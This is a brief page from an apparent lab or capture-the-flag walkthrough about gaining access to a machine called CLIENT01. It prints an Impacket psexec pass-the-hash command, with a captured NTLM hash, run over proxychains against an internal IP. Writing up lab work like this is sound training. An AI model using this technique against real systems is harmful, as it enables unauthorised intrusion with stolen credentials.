---
description: Internal machine
---

# CLIENT01

My initial access to this machine is provided via `yoshi`'s hash [found](files02.md#yoshi) on `FILES02`. `yoshi` has Read,Write access to some of the SMB shares on this machine and thus can access it via Impacket's `PsExec` over `proxychains`:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>rlwrap proxychains impacket-psexec -hashes 00000000000000000000000000000000:fdf36048c1cf88f5630381c5e38feb8e yoshi@172.16.215.82
</strong></code></pre>

<figure><img src="../../.gitbook/assets/Medtech-CLIENT01-SystemPsExec.png" alt=""><figcaption><p>PsExec</p></figcaption></figure>

There was not a ton here. I will come back later with elevated privileges.
